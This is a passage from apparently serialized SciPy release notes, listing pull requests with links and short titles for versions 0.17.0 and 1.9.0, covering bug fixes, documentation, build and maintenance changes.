<https://github.com/scipy/scipy/pull/5188>`__: MAINT: linalg: A bit of clean up.\n- `5189 <https://github.com/scipy/scipy/pull/5189>`__: BUG: stats: Use the explicit formula in stats.genextreme.entropy\n- `5193 <https://github.com/scipy/scipy/pull/5193>`__: BUG: fix uninitialized use in lartg\n- `5194 <https://github.com/scipy/scipy/pull/5194>`__: BUG: properly return error to fortran from ode_jacobian_function\n- `5198 <https://github.com/scipy/scipy/pull/5198>`__: TST: Fix TestCtypesQuad failure on Python 3.5 for Windows\n- `5201 <https://github.com/scipy/scipy/pull/5201>`__: allow extrapolation in interp1d\n- `5209 <https://github.com/scipy/scipy/pull/5209>`__: MAINT: Change complex parameter to boolean in Y_()\n- `5213 <https://github.com/scipy/scipy/pull/5213>`__: BUG: sparse: fix logical comparison dtype conflicts\n- `5216 <https://github.com/scipy/scipy/pull/5216>`__: BUG: sparse: fixing unbound local error\n- `5218 <https://github.com/scipy/scipy/pull/5218>`__: DOC and BUG: Bessel function docstring improvements, fix array_like,...\n- `5222 <https://github.com/scipy/scipy/pull/5222>`__: MAINT: sparse: fix COO ctor\n- `5224 <https://github.com/scipy/scipy/pull/5224>`__: DOC: optimize: type of OptimizeResult.hess_inv varies\n- `5228 <https://github.com/scipy/scipy/pull/5228>`__: ENH: Add maskandscale support to netcdf; based on pupynere and...\n- `5229 <https://github.com/scipy/scipy/pull/5229>`__: DOC: sparse.linalg.svds doc typo fixed\n- `5234 <https://github.com/scipy/scipy/pull/5234>`__: MAINT: sparse: simplify COO ctor\n- `5235 <https://github.com/scipy/scipy/pull/5235>`__: MAINT: sparse: warn on todia() with many diagonals\n- `5236 <https://github.com/scipy/scipy/pull/5236>`__: MAINT: ndimage: simplify thread handling/recursion + constness\n- `5239 <https://github.com/scipy/scipy/pull/5239>`__: BUG: integrate: Fixed issue 4118\n- `5241 <https://github.com/scipy/scipy/pull/5241>`__: qr_insert fixes, closes #5149\n- `5246 <https://github.com/scipy/scipy/pull/5246>`__: Doctest tutorial files\n- `5247 <https://github.com/scipy/scipy/pull/5247>`__: DOC: optimize: typo/import fix in linear_sum_assignment\n- `5248 <https://github.com/scipy/scipy/pull/5248>`__: remove inspect.getargspec and test python 3.5 on Travis CI\n- `5250 <https://github.com/scipy/scipy/pull/5250>`__: BUG: Fix sparse multiply by single-element zero\n- `5261 <https://github.com/scipy/scipy/pull/5261>`__: Fix bug causing a TypeError in splrep when a runtime warning...\n- `5262 <https://github.com/scipy/scipy/pull/5262>`__: Follow up to 4489 (Addition LAPACK routines in linalg.lstsq)\n- `5264 <https://github.com/scipy/scipy/pull/5264>`__: ignore zero-length edges for default epsilon\n- `5269 <https://github.com/scipy/scipy/pull/5269>`__: DOC: Typos and spell-checking\n- `5272 <https://github.com/scipy/scipy/pull/5272>`__: MAINT: signal: Convert array syntax to memoryviews\n- `5273 <https://github.com/scipy/scipy/pull/5273>`__: DOC: raw strings for docstrings with math\n- `5274 <https://github.com/scipy/scipy/pull/5274>`__: MAINT: sparse: update cython code for MST\n- `5278 <https://github.com/scipy/scipy/pull/5278>`__: BUG: io: Stop guessing the data delimiter in ARFF files.\n- `5289 <https://github.com/scipy/scipy/pull/5289>`__: BUG: misc: Fix the Pillow work-around for 1-bit images.\n- `5291 <https://github.com/scipy/scipy/pull/5291>`__: ENH: call np.correlate for 1d in scipy.signal.correlate\n- `5294 <https://github.com/scipy/scipy/pull/5294>`__: DOC: special: Remove a potentially misleading example from the...\n- `5295 <https://github.com/scipy/scipy/pull/5295>`__: Simplify replacement of fftpack by pyfftw\n- `5296 <https://github.com/scipy/scipy/pull/5296>`__: ENH: Add matrix normal distribution to stats\n- `5297 <https://github.com/scipy/scipy/pull/5297>`__: Fixed leaf_rotation and leaf_font_size in Python 3\n- `5303 <https://github.com/scipy/scipy/pull/5303>`__: MAINT: stats: rewrite find_repeats\n- `5307 <https://github.com/scipy/scipy/pull/5307>`__: MAINT: stats: remove unused Fortran routine\n- `5313 <https://github.com/scipy/scipy/pull/5313>`__: BUG: sparse: fix diags for nonsquare matrices\n- `5315 <https://github.com/scipy/scipy/pull/5315>`__: MAINT: special: Cephes cleanup\n- `5316 <https://github.com/scipy/scipy/pull/5316>`__: fix input check for sparse.linalg.svds\n- `5319 <https://github.com/scipy/scipy/pull/5319>`__: MAINT: Cython code maintenance\n- `5328 <https://github.com/scipy/scipy/pull/5328>`__: BUG: Fix place_poles return values\n- `5329 <https://github.com/scipy/scipy/pull/5329>`__: avoid a spurious divide-by-zero in Student t stats\n- `5334 <https://github.com/scipy/scipy/pull/5334>`__: MAINT: integrate: miscellaneous cleanup\n- `5340 <https://github.com/scipy/scipy/pull/5340>`__: MAINT: Printing Error Msg to STDERR and Removing iterate.dat\n- `5347 <https://github.com/scipy/scipy/pull/5347>`__: ENH: add Py3.5-style matmul operator (e.g. A  B) to sparse linear...\n- `5350 <https://github.com/scipy/scipy/pull/5350>`__: FIX error, when reading 32-bit float wav files\n- `5351 <https://github.com/scipy/scipy/pull/5351>`__: refactor the PCHIP interpolant's algorithm\n- `5354 <https://github.com/scipy/scipy/pull/5354>`__: MAINT: construct csr and csc matrices from integer lists\n- `5359 <https://github.com/scipy/scipy/pull/5359>`__: add a fast path to interp1d\n- `5364 <https://github.com/scipy/scipy/pull/5364>`__: Add two fill_values to interp1d.\n- `5365 <https://github.com/scipy/scipy/pull/5365>`__: ABCD docstrings\n- `5366 <https://github.com/scipy/scipy/pull/5366>`__: Fixed typo in the documentation for scipy.signal.cwt() per #5290.\n- `5367 <https://github.com/scipy/scipy/pull/5367>`__: DOC updated scipy.spatial.Delaunay example\n- `5368 <https://github.com/scipy/scipy/pull/5368>`__: ENH: Do not create a throwaway class at every function call\n- `5372 <https://github.com/scipy/scipy/pull/5372>`__: DOC: spectral: fix reference formatting\n- `5375 <https://github.com/scipy/scipy/pull/5375>`__: PEP8 amendments to ffpack_basic.py\n- `5377 <https://github.com/scipy/scipy/pull/5377>`__: BUG: integrate: builtin name no longer shadowed\n- `5381 <https://github.com/scipy/scipy/pull/5381>`__: PEP8ified fftpack_pseudo_diffs.py\n- `5385 <https://github.com/scipy/scipy/pull/5385>`__: BLD: fix Bento build for changes to optimize and spatial\n- `5386 <https://github.com/scipy/scipy/pull/5386>`__: STY: PEP8 amendments to interpolate.py\n- `5387 <https://github.com/scipy/scipy/pull/5387>`__: DEP: deprecate stats.histogram\n- `5388 <https://github.com/scipy/scipy/pull/5388>`__: REL: add \"make upload\" command to doc/Makefile.\n- `5389 <https://github.com/scipy/scipy/pull/5389>`__: DOC: updated origin param of scipy.ndimage.filters.convolve\n- `5395 <https://github.com/scipy/scipy/pull/5395>`__: BUG: special: fix a number of edge cases related to `x = np.inf`.\n- `5398 <https://github.com/scipy/scipy/pull/5398>`__: MAINT: stats: avoid spurious warnings in lognorm.pdf(0, s)\n- `5407 <https://github.com/scipy/scipy/pull/5407>`__: ENH: stats: Handle mu=0 in stats.poisson\n- `5409 <https://github.com/scipy/scipy/pull/5409>`__: Fix the behavior of discrete distributions at the right-hand...\n- `5412 <https://github.com/scipy/scipy/pull/5412>`__: TST: stats: skip a test to avoid a spurious log(0) warning\n- `5413 <https://github.com/scipy/scipy/pull/5413>`__: BUG: linalg: work around LAPACK single-precision lwork computation...\n- `5414 <https://github.com/scipy/scipy/pull/5414>`__: MAINT: stats: move creation of namedtuples outside of function...\n- `5415 <https://github.com/scipy/scipy/pull/5415>`__: DOC: fix up sections in ToC in the pdf reference guide\n- `5416 <https://github.com/scipy/scipy/pull/5416>`__: TST: fix issue with a ctypes test for integrate on Fedora.\n- `5418 <https://github.com/scipy/scipy/pull/5418>`__: DOC: fix bugs in signal.TransferFunction docstring. Closes gh-5287.\n- `5419 <https://github.com/scipy/scipy/pull/5419>`__: MAINT: sparse: fix usage of NotImplementedError\n- `5420 <https://github.com/scipy/scipy/pull/5420>`__: Raise proper error if maxiter < 1\n- `5422 <https://github.com/scipy/scipy/pull/5422>`__: DOC: changed documentation of brent to be consistent with bracket\n- `5444 <https://github.com/scipy/scipy/pull/5444>`__: BUG: gaussian_filter, BPoly.from_derivatives fail on numpy int...\n- `5445 <https://github.com/scipy/scipy/pull/5445>`__: MAINT: stats: fix incorrect deprecation warnings and test noise\n- `5446 <https://github.com/scipy/scipy/pull/5446>`__: DOC: add note about PyFFTW in fftpack tutorial.\n- `5459 <https://github.com/scipy/scipy/pull/5459>`__: DOC: integrate: Some improvements to the differential equation...\n- `5465 <https://github.com/scipy/scipy/pull/5465>`__: BUG: Relax mstats kurtosis test tolerance by a few ulp\n- `5471 <https://github.com/scipy/scipy/pull/5471>`__: ConvexHull should raise ValueError for NaNs.\n- `5473 <https://github.com/scipy/scipy/pull/5473>`__: MAINT: update decorators.py module to version 4.0.5\n- `5476 <https://github.com/scipy/scipy/pull/5476>`__: BUG: imsave searches for wrong channel axis if image has 3 or...\n- `5477 <https://github.com/scipy/scipy/pull/5477>`__: BLD: add numpy to setup/install_requires for OS X wheels\n- `5479 <https://github.com/scipy/scipy/pull/5479>`__: ENH: return Jacobian/Hessian from BasinHopping\n- `5484 <https://github.com/scipy/scipy/pull/5484>`__: BUG: fix ttest zero division handling\n- `5486 <https://github.com/scipy/scipy/pull/5486>`__: Fix crash on kmeans2\n- `5491 <https://github.com/scipy/scipy/pull/5491>`__: MAINT: Expose parallel build option to runtests.py\n- `5494 <https://github.com/scipy/scipy/pull/5494>`__: Sort OptimizeResult.__repr__ by key\n- `5496 <https://github.com/scipy/scipy/pull/5496>`__: DOC: update the author name mapping\n- `5497 <https://github.com/scipy/scipy/pull/5497>`__: Enhancement to binned_statistic: option to unraveled returned...\n- `5498 <https://github.com/scipy/scipy/pull/5498>`__: BUG: sparse: fix a bug in sparsetools input dtype resolution\n- `5500 <https://github.com/scipy/scipy/pull/5500>`__: DOC: detect unprintable characters in docstrings\n- `5505 <https://github.com/scipy/scipy/pull/5505>`__: BUG: misc: Ensure fromimage converts mode 'P' to 'RGB' or 'RGBA'.\n- `5514 <https://github.com/scipy/scipy/pull/5514>`__: DOC: further update the release notes\n- `5515 <https://github.com/scipy/scipy/pull/5515>`__: ENH: optionally disable fixed-point acceleration\n- `5517 <https://github.com/scipy/scipy/pull/5517>`__: DOC: Improvements and additions to the matrix_normal doc\n- `5518 <https://github.com/scipy/scipy/pull/5518>`__: Remove wrappers for LAPACK deprecated routines\n- `5521 <https://github.com/scipy/scipy/pull/5521>`__: TST: skip a linalg.orth memory test on 32-bit platforms.\n- `5523 <https://github.com/scipy/scipy/pull/5523>`__: DOC: change a few floats to integers in docstring examples\n- `5524 <https://github.com/scipy/scipy/pull/5524>`__: DOC: more updates to 0.17.0 release notes.\n- `5525 <https://github.com/scipy/scipy/pull/5525>`__: Fix to minor typo in documentation for scipy.integrate.ode\n- `5527 <https://github.com/scipy/scipy/pull/5527>`__: TST: bump arccosh tolerance to allow for inaccurate numpy or...\n- `5535 <https://github.com/scipy/scipy/pull/5535>`__: DOC: signal: minor clarification to docstring of TransferFunction.\n- `5538 <https://github.com/scipy/scipy/pull/5538>`__: DOC: signal: fix find_peaks_cwt documentation\n- `5545 <https://github.com/scipy/scipy/pull/5545>`__: MAINT: Fix typo in linalg/basic.py\n- `5547 <https://github.com/scipy/scipy/pull/5547>`__: TST: mark TestEig.test_singular as knownfail in master.\n- `5550 <https://github.com/scipy/scipy/pull/5550>`__: MAINT: work around lstsq driver selection issue\n- `5556 <https://github.com/scipy/scipy/pull/5556>`__: BUG: Fixed broken dogbox trust-region radius update\n- `5561 <https://github.com/scipy/scipy/pull/5561>`__: BUG: eliminate warnings, exception (on Win) in test_maskandscale;...\n- `5567 <https://github.com/scipy/scipy/pull/5567>`__: TST: a few cleanups in the test suite; run_module_suite and clearer...\n- `5568 <https://github.com/scipy/scipy/pull/5568>`__: MAINT: simplify poisson's _argcheck\n- `5569 <https://github.com/scipy/scipy/pull/5569>`__: TST: bump GMean test tolerance to make it pass on Wine\n- `5572 <https://github.com/scipy/scipy/pull/5572>`__: TST: lstsq: bump test tolerance for TravisCI\n- `5573 <https://github.com/scipy/scipy/pull/5573>`__: TST: remove use of np.fromfile from cluster.vq tests\n- `5576 <https://github.com/scipy/scipy/pull/5576>`__: Lapack deprecations\n- `5579 <https://github.com/scipy/scipy/pull/5579>`__: TST: skip tests of linalg.norm axis keyword on numpy <= 1.7.x\n- `5582 <https://github.com/scipy/scipy/pull/5582>`__: Clarify language of survival function documentation\n- `5583 <https://github.com/scipy/scipy/pull/5583>`__: MAINT: stats/tests: A bit of clean up.\n- `5588 <https://github.com/scipy/scipy/pull/5588>`__: DOC: stats: Add a note that stats.burr is the Type III Burr distribution.\n- `5595 <https://github.com/scipy/scipy/pull/5595>`__: TST: fix test_lamch failures on Python 3\n- `5600 <https://github.com/scipy/scipy/pull/5600>`__: MAINT: Ignore spatial/ckdtree.cxx and .h\n- `5602 <https://github.com/scipy/scipy/pull/5602>`__: Explicitly numbered replacement fields for maintainability\n- `5605 <https://github.com/scipy/scipy/pull/5605>`__: MAINT: collection of small fixes to test suite\n- `5614 <https://github.com/scipy/scipy/pull/5614>`__: Minor doc change.\n- `5624 <https://github.com/scipy/scipy/pull/5624>`__: FIX: Fix interpolate\n- `5625 <https://github.com/scipy/scipy/pull/5625>`__: BUG: msvc9 binaries crash when indexing std::vector of size 0\n- `5635 <https://github.com/scipy/scipy/pull/5635>`__: BUG: misspelled __dealloc__ in cKDTree.\n- `5642 <https://github.com/scipy/scipy/pull/5642>`__: STY: minor fixup of formatting of 0.17.0 release notes.\n- `5643 <https://github.com/scipy/scipy/pull/5643>`__: BLD: fix a build issue in special/Faddeeva.cc with isnan.\n- `5661 <https://github.com/scipy/scipy/pull/5661>`__: TST: linalg tests used stdlib random instead of numpy.random.\n- `5682 <https://github.com/scipy/scipy/pull/5682>`__: backports for 0.17.0\n- `5696 <https://github.com/scipy/scipy/pull/5696>`__: Minor improvements to least_squares' docstring.\n- `5697 <https://github.com/scipy/scipy/pull/5697>`__: BLD: fix for isnan/isinf issues in special/Faddeeva.cc\n- `5720 <https://github.com/scipy/scipy/pull/5720>`__: TST: fix for file opening error in fftpack test_import.py\n- `5722 <https://github.com/scipy/scipy/pull/5722>`__: BUG: Make curve_fit respect an initial guess with bounds\n- `5726 <https://github.com/scipy/scipy/pull/5726>`__: Backports for v0.17.0rc2\n- `5727 <https://github.com/scipy/scipy/pull/5727>`__: API: Changes to least_squares API\n\n\n==========================\n", "1.9.0": "***********************\n\n* `9523 <https://github.com/scipy/scipy/pull/9523>`__: ENH: improvements to the Stable distribution\n* `11829 <https://github.com/scipy/scipy/pull/11829>`__: Fixes safe handling of small singular values in svds.\n* `13490 <https://github.com/scipy/scipy/pull/13490>`__: DEV: stats: check for distribution/method keyword name collisions\n* `13572 <https://github.com/scipy/scipy/pull/13572>`__: ENH: n-D and nan_policy support for scipy.stats.percentileofscore\n* `13918 <https://github.com/scipy/scipy/pull/13918>`__: ENH: Poisson Disk sampling for QMC\n* `13955 <https://github.com/scipy/scipy/pull/13955>`__: DOC: SciPy extensions for code style and docstring guidelines.\n* `14003 <https://github.com/scipy/scipy/pull/14003>`__: DOC: clarify the definition of the pdf of \\`stats.fisk\\`\n* `14036 <https://github.com/scipy/scipy/pull/14036>`__: ENH: fix numerical issues in roots_jacobi and related special...\n* `14087 <https://github.com/scipy/scipy/pull/14087>`__: DOC: explain null hypotheses in ttest functions\n* `14142 <https://github.com/scipy/scipy/pull/14142>`__: DOC: Add better error message for unpacking issue\n* `14143 <https://github.com/scipy/scipy/pull/14143>`__: Support LinearOperator in expm_multiply\n* `14300 <https://github.com/scipy/scipy/pull/14300>`__: ENH: Adding DIRECT algorithm to \\`\\`scipy.optimize\\`\\`\n* `14576 <https://github.com/scipy/scipy/pull/14576>`__: ENH: stats: add one-sample Monte Carlo hypothesis test\n* `14642 <https://github.com/scipy/scipy/pull/14642>`__: ENH: add Lloyd's algorithm to \\`scipy.spatial\\` to improve a...\n* `14718 <https://github.com/scipy/scipy/pull/14718>`__: DOC: stats: adjust bootstrap doc to emphasize that batch controls...\n* `14781 <https://github.com/scipy/scipy/pull/14781>`__: BUG: stats: handle infinite \\`df\\` in \\`t\\` distribution\n* `14847 <https://github.com/scipy/scipy/pull/14847>`__: ENH: BLD: enable building SciPy with Meson\n* `14877 <https://github.com/scipy/scipy/pull/14877>`__: DOC: ndimage convolve origin documentation (#14745)\n* `15001 <https://github.com/scipy/scipy/pull/15001>`__: ENH: sparse.linalg: More comprehensive tests (Not only for 1-D...\n* `15026 <https://github.com/scipy/scipy/pull/15026>`__: ENH: allow approx_fprime to work with vector-valued func\n* `15079 <https://github.com/scipy/scipy/pull/15079>`__: ENH:linalg: expm overhaul and ndarray processing\n* `15140 <https://github.com/scipy/scipy/pull/15140>`__: ENH: Make \\`stats.kappa3\\` work with array inputs\n* `15154 <https://github.com/scipy/scipy/pull/15154>`__: DOC: a small bug in docstring example of \\`lobpcg\\`\n* `15165 <https://github.com/scipy/scipy/pull/15165>`__: MAINT: Avoid using del to remove numpy symbols in scipy.__init__.py\n* `15168 <https://github.com/scipy/scipy/pull/15168>`__: REL: set version to 1.9.0.dev0\n* `15169 <https://github.com/scipy/scipy/pull/15169>`__: DOC: fix formatting of Methods in multivariate distributions\n* `15171 <https://github.com/scipy/scipy/pull/15171>`__: \\`AttrDict\\` raises \\`AttributeError\\` on missing attributes,...\n* `15176 <https://github.com/scipy/scipy/pull/15176>`__: BUG: special: Clean up some private namespaces and fix \\`special.__all__\\`\n* `15182 <https://github.com/scipy/scipy/pull/15182>`__: MAINT: fix typos principle -> principal\n* `15184 <https://github.com/scipy/scipy/pull/15184>`__: MAINT: CI: Rename 'Nightly CPython' job to 'NumPy main'\n* `15187 <https://github.com/scipy/scipy/pull/15187>`__: BUG: special: Fix numerical precision issue of log_ndtr\n* `15188 <https://github.com/scipy/scipy/pull/15188>`__: MAINT: sparse.linalg: Using more concise and user-friendly f-string...\n* `15190 <https://github.com/scipy/scipy/pull/15190>`__: MAINT: interpolate: speed up the RBFInterpolator evaluation with...\n* `15196 <https://github.com/scipy/scipy/pull/15196>`__: BUG: stats: Fix handling of support endpoints in two distributions.\n* `15197 <https://github.com/scipy/scipy/pull/15197>`__: MAINT: build dependency updates\n* `15202 <https://github.com/scipy/scipy/pull/15202>`__: MAINT: special: Don't use macro for 'extern \"C\"' in strictly...\n* `15205 <https://github.com/scipy/scipy/pull/15205>`__: BUG: stats: Fix spurious warnings generated by several distributions.\n* `15207 <https://github.com/scipy/scipy/pull/15207>`__: MAINT: sparse.linalg: Using the interface with the trace of sparse...\n* `15219 <https://github.com/scipy/scipy/pull/15219>`__: DOC: Corrected docstring of ndimage.sum_labels\n* `15223 <https://github.com/scipy/scipy/pull/15223>`__: DOC: x0->x for finite_diff_rel_step docstring closes #15208\n* `15230 <https://github.com/scipy/scipy/pull/15230>`__: ENH: expose submodules via \\`__getattr__\\` to allow lazy access\n* `15234 <https://github.com/scipy/scipy/pull/15234>`__: TST: stats: mark very slow tests as \\`xslow\\`\n* `15235 <https://github.com/scipy/scipy/pull/15235>`__: BUG: Fix rmul dispatch of spmatrix\n* `15243 <https://github.com/scipy/scipy/pull/15243>`__: DOC: stats: add reference for gstd\n* `15244 <https://github.com/scipy/scipy/pull/15244>`__: Added example for morphology: binary_dilation and erosion\n* `15250 <https://github.com/scipy/scipy/pull/15250>`__: ENH: Make \\`stats.kappa4\\` work with array\n* `15251 <https://github.com/scipy/scipy/pull/15251>`__: [MRG] ENH: Update \\`laplacian\\` function introducing the new...\n* `15255 <https://github.com/scipy/scipy/pull/15255>`__: MAINT: Remove \\`distutils\\` usage in \\`runtests.py\\` to fix deprecation...\n* `15259 <https://github.com/scipy/scipy/pull/15259>`__: MAINT: optimize, special, signal: Use custom warnings instead...\n* `15261 <https://github.com/scipy/scipy/pull/15261>`__: DOC: Add inline comment in Hausdorff distance calculation\n* `15265 <https://github.com/scipy/scipy/pull/15265>`__: DOC: update .mailmap\n* `15266 <https://github.com/scipy/scipy/pull/15266>`__: CI: remove coverage usage from Windows jobs\n* `15269 <https://github.com/scipy/scipy/pull/15269>`__: BLD: add setup.py for \\`stats/_levy_stable\\`\n* `15272 <https://github.com/scipy/scipy/pull/15272>`__: BUG: Fix owens_t function when a tends to infinity\n* `15274 <https://github.com/scipy/scipy/pull/15274>`__: DOC: fix docstring in _cdf() function of _multivariate.py\n* `15284 <https://github.com/scipy/scipy/pull/15284>`__: TST: silence RuntimeWarning from \\`np.det\\` in \\`signal.place_poles\\`...\n* `15285 <https://github.com/scipy/scipy/pull/15285>`__: CI: simplify 32-bit Linux testing\n* `15286 <https://github.com/scipy/scipy/pull/15286>`__: MAINT: Highs submodule CI issue - use shallow cloning\n* `15289 <https://github.com/scipy/scipy/pull/15289>`__: DOC: Misc numpydoc formatting.\n* `15291 <https://github.com/scipy/scipy/pull/15291>`__: DOC: some more docstring/numpydoc formatting.\n* `15294 <https://github.com/scipy/scipy/pull/15294>`__: ENH: add integrality constraints for linprog\n* `15300 <https://github.com/scipy/scipy/pull/15300>`__: DOC: Misc manual docs updates.\n* `15302 <https://github.com/scipy/scipy/pull/15302>`__: DOC: More docstring reformatting.\n* `15304 <https://github.com/scipy/scipy/pull/15304>`__: CI: fix Gitpod build by adding HiGHS submodule checkout\n* `15305 <https://github.com/scipy/scipy/pull/15305>`__: BLD: update NumPy to >=1.18.5, setuptools to <60.0\n* `15309 <https://github.com/scipy/scipy/pull/15309>`__: CI: update OpenBLAS to 0.3.18 in Azure jobs\n* `15310 <https://github.com/scipy/scipy/pull/15310>`__: ENH: signal: Add Kaiser-Bessel derived window function\n* `15312 <https://github.com/scipy/scipy/pull/15312>`__: BUG: special: Fix loss of precision in pseudo_huber when r/delta...\n* `15314 <https://github.com/scipy/scipy/pull/15314>`__: MAINT: changed needed after renaming \\`master\\` branch to \\`main\\`\n* `15315 <https://github.com/scipy/scipy/pull/15315>`__: MAINT: account for NumPy master -> main renaming\n* `15325 <https://github.com/scipy/scipy/pull/15325>`__: CI: reshuffle two Windows Azure CI jobs, and don't run 'full'...\n* `15330 <https://github.com/scipy/scipy/pull/15330>`__: ENH: optimize: support undocumented option \\`full_output\\` for...\n* `15336 <https://github.com/scipy/scipy/pull/15336>`__: DOC: update detailed roadmap\n* `15344 <https://github.com/scipy/scipy/pull/15344>`__: MAINT:stats: Renamed \\`\\*args\\` param to \\`\\*samples\\`\n* `15347 <https://github.com/scipy/scipy/pull/15347>`__: ENH: stats: add weights in harmonic mean\n* `15352 <https://github.com/scipy/scipy/pull/15352>`__: BLD: put upper bound \\`setuptools<60.0\\` in conda environment...\n* `15357 <https://github.com/scipy/scipy/pull/15357>`__: ENH: interpolate: add new methods for RegularGridInterpolator.\n* `15360 <https://github.com/scipy/scipy/pull/15360>`__: MAINT: speed up rvs of nakagami in scipy.stats\n* `15361 <https://github.com/scipy/scipy/pull/15361>`__: MAINT: sparse.linalg: Remove unnecessary operations\n* `15366 <https://github.com/scipy/scipy/pull/15366>`__: Make signal functions respect input dtype.\n* `15370 <https://github.com/scipy/scipy/pull/15370>`__: DOC: governance members moved to scipy.org\n* `15371 <https://github.com/scipy/scipy/pull/15371>`__: MAINT: stats: fix unuran compile-time warnings\n* `15378 <https://github.com/scipy/scipy/pull/15378>`__: MAINT: remove version pinning on gmpy2\n* `15380 <https://github.com/scipy/scipy/pull/15380>`__: ENH/MAINT: Version switcher from the sphinx theme\n* `15385 <https://github.com/scipy/scipy/pull/15385>`__: DOC: fix typo\n* `15387 <https://github.com/scipy/scipy/pull/15387>`__: MAINT: Fix a couple build warnings.\n* `15388 <https://github.com/scipy/scipy/pull/15388>`__: DOC: interpolate: improve \\`RectBivariateSpline\\` doc\n* `15391 <https://github.com/scipy/scipy/pull/15391>`__: ENH: graph Laplacian as LinearOperator, add dtype and symmetrized...\n* `15392 <https://github.com/scipy/scipy/pull/15392>`__: ENH: integrality constraints for differential_evolution\n* `15394 <https://github.com/scipy/scipy/pull/15394>`__: ENH: optimize: improvements to \\`LinearConstraint\\` class\n* `15396 <https://github.com/scipy/scipy/pull/15396>`__: DOC: Git:// protocol on github pending removal.\n* `15399 <https://github.com/scipy/scipy/pull/15399>`__: ENH: stats: add \\`axis\\` tuple and \\`nan_policy\\` to \\`hmean\\`\n* `15400 <https://github.com/scipy/scipy/pull/15400>`__: MAINT: sparse.linalg: Move the test function of GMRES to the...\n* `15401 <https://github.com/scipy/scipy/pull/15401>`__: MAINT: DOC: analytics from analytics.scientific-python\n* `15402 <https://github.com/scipy/scipy/pull/15402>`__: DOC: update pip_quickstart (submodules)\n* `15406 <https://github.com/scipy/scipy/pull/15406>`__: MAINT: use \\`Rotation.Random\\` instead of manual generation\n* `15407 <https://github.com/scipy/scipy/pull/15407>`__: BLD: meson: split pyx->c and Python extension build\n* `15408 <https://github.com/scipy/scipy/pull/15408>`__: MAINT: check for negative weights in \\`Rotation.align_vectors\\`\n* `15410 <https://github.com/scipy/scipy/pull/15410>`__: ENH: add \\`order\\` parameter to specify quaternion format\n* `15413 <https://github.com/scipy/scipy/pull/15413>`__: ENH: stats: add \\`rvs\\` method for \\`gennorm\\`\n* `15424 <https://github.com/scipy/scipy/pull/15424>`__: ENH: bypass LinearOperator in lobpcg for small-size cases\n* `15427 <https://github.com/scipy/scipy/pull/15427>`__: MAINT: Manage imports in \\`sparse.linalg\\`\n* `15431 <https://github.com/scipy/scipy/pull/15431>`__: Revert \"ENH: add \\`order\\` parameter to specify quaternion format\"\n* `15436 <https://github.com/scipy/scipy/pull/15436>`__: ENH: stats: fit: function for fitting discrete and continuous...\n* `15439 <https://github.com/scipy/scipy/pull/15439>`__: ENH: differential_evolution vectorized kwd\n* `15440 <https://github.com/scipy/scipy/pull/15440>`__: MAINT: Try to detect scipy path in \\`runtests.py\\` while not...\n* `15442 <https://github.com/scipy/scipy/pull/15442>`__: MAINT: Fix meson build warnings on windows\n* `15443 <https://github.com/scipy/scipy/pull/15443>`__: DOC, BUG: Fix error in heading remapping for custom \\`scipy.optimize:function\\` domain directive\n* `15445 <https://github.com/scipy/scipy/pull/15445>`__: ENH: stats: add \\`nnlf\\` method for discrete distributions\n* `15451 <https://github.com/scipy/scipy/pull/15451>`__: BLD: further refinement of Cython dependencies\n* `15452 <https://github.com/scipy/scipy/pull/15452>`__: BUG/DOC/TST: combine_pvalues: fix Tippett and Pearson\n* `15453 <https://github.com/scipy/scipy/pull/15453>`__: ENH: Make dual_annealing work with Bounds class\n* `15454 <https://github.com/scipy/scipy/pull/15454>`__: BLD: remove dependency on libnpymath from \\`spatial._distance_wrap\\`\n* `15455 <https://github.com/scipy/scipy/pull/15455>`__: ENH: Support Bounds class in shgo\n* `15459 <https://github.com/scipy/scipy/pull/15459>`__: DOC: documents parameter \\`limit\\` for function \\`integrate.quad_vec\\`.\n* `15460 <https://github.com/scipy/scipy/pull/15460>`__: ENH: optimize: milp: mixed integer linear programming\n* `15462 <https://github.com/scipy/scipy/pull/15462>`__: CI: switch one macOS CI job from distutils to meson\n* `15464 <https://github.com/scipy/scipy/pull/15464>`__: ENH: Performance improvements for \\`linear_sum_assignment\\`\n* `15465 <https://github.com/scipy/scipy/pull/15465>`__: DOC: stats: add weights in formulas and examples for gmean and...\n* `15466 <https://github.com/scipy/scipy/pull/15466>`__: MAINT: fix compile errors with CPython 3.11\n* `15469 <https://github.com/scipy/scipy/pull/15469>`__: MAINT: Remove \\`distutils\\` usage\n* `15470 <https://github.com/scipy/scipy/pull/15470>`__: ENH: \\`stats.qmc\\`: faster hypercube point comparison and scrambling...\n* `15472 <https://github.com/scipy/scipy/pull/15472>`__: ENH: stats: add \\`axis\\` tuple and \\`nan_policy\\` to \\`skew\\`\n* `15485 <https://github.com/scipy/scipy/pull/15485>`__: BLD: updates to Meson build files for more correct linking and...\n* `15487 <https://github.com/scipy/scipy/pull/15487>`__: MAINT: typo in bsplines.py\n* `15496 <https://github.com/scipy/scipy/pull/15496>`__: DOC: signal: fixed parameter 'order' for butter bandpass\n* `15497 <https://github.com/scipy/scipy/pull/15497>`__: MAINT: update vendored uarray\n* `15499 <https://github.com/scipy/scipy/pull/15499>`__: CI: remove matplotlib from 32-bit linux job, it fails to build\n* `15501 <https://github.com/scipy/scipy/pull/15501>`__: MAINT: Remove unused variable warnings\n* `15502 <https://github.com/scipy/scipy/pull/15502>`__: DEV: meson: allow specifying build directory and install prefix\n* `15512 <https://github.com/scipy/scipy/pull/15512>`__: MAINT: optimize.linprog: make HiGHS default and deprecate old...\n* `15523 <https://github.com/scipy/scipy/pull/15523>`__: DOC: fixed the link for fluiddyn's transonic vision in dev/roadmap.html.\n* `15526 <https://github.com/scipy/scipy/pull/15526>`__: MAINT: add qrvs method to NumericalInversePolynomial in scipy.stats\n* `15529 <https://github.com/scipy/scipy/pull/15529>`__: DOC: forward port 1.8.0 relnotes\n* `15532 <https://github.com/scipy/scipy/pull/15532>`__: TST: parametrize test_ldl_type_size_combinations\n* `15546 <https://github.com/scipy/scipy/pull/15546>`__: DOC: missing section for metrics\n* `15555 <https://github.com/scipy/scipy/pull/15555>`__: MAINT: make unuran clone shallow\n* `15557 <https://github.com/scipy/scipy/pull/15557>`__: DOC: fixes inaccuracy in bisplev documentation\n* `15559 <https://github.com/scipy/scipy/pull/15559>`__: BENCH: selection of linalg solvers to facilitate expansion\n* `15560 <https://github.com/scipy/scipy/pull/15560>`__: DOC: types and return values for Bessel Functions\n* `15561 <https://github.com/scipy/scipy/pull/15561>`__: MAINT: update HiGHS submodule to include fix for Windows segfault\n* `15563 <https://github.com/scipy/scipy/pull/15563>`__: CI: add a Windows CI job on GitHub Actions using Meson\n* `15564 